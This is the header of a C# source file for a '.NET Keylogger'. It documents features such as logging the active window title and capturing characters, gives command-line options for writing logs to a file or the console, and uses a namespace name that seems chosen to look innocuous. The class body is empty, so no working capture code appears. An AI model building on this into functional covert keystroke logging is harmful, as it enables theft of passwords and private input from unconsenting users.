/* *************************************************************************** *
 *  Title: .NET Keylogger
 * Author: _DmG_
 *   Date: 5/21/2007
 *   Type: Open Source
 * 
 * This software is based off "ArticleKeyLog";
 * which can be found at www.codeproject.com.
 * Alexander Kent is the original author. I have
 * modified the source to include some more advanced
 * logging features I thought were needed.
 * 
 * Added features:
 * » Focused/Active window title logging.
 * » Accurate character detection.(His version would display only CAPS)
 * » Log file formatting.
 * » Custom args [below]
 * *************************************************************************** *
 * Usage:
 * You have several args you can pass to customize the
 * program's execution.
 * netLogger.exe -f [filename] -m [mode] -i [interval] -o [output]
 *		-f [filename](Name of the file. ".log" will always be the ext.)
 *		-m ['hour' or 'day'] saves logfile name appended by the hour or day.
 *		-i [interval] in milliseconds, flushes the buffer to either the
 *					  console or file. Shorter time = more cpu usage.
 *					  10000=10seconds : 60000=1minute : etc...
 *		-o ['file' or 'console'] Outputs all data to either a file or console.
 * *************************************************************************** *
 * ArticleKeyLog - Basic Keystroke Mining
 * Date:	05/12/2005
 * Author:	Alexander Kent
 * (www.codeproject.com)
 * *************************************************************************** */

using System;
using System.IO;
using System.Text;
using System.Windows.Forms;
using System.Runtime.InteropServices;

namespace servicioPaginaNoMicrosoft
{
    public class Keylogger
    {
        

        

        

        

        

        

        

    }
}
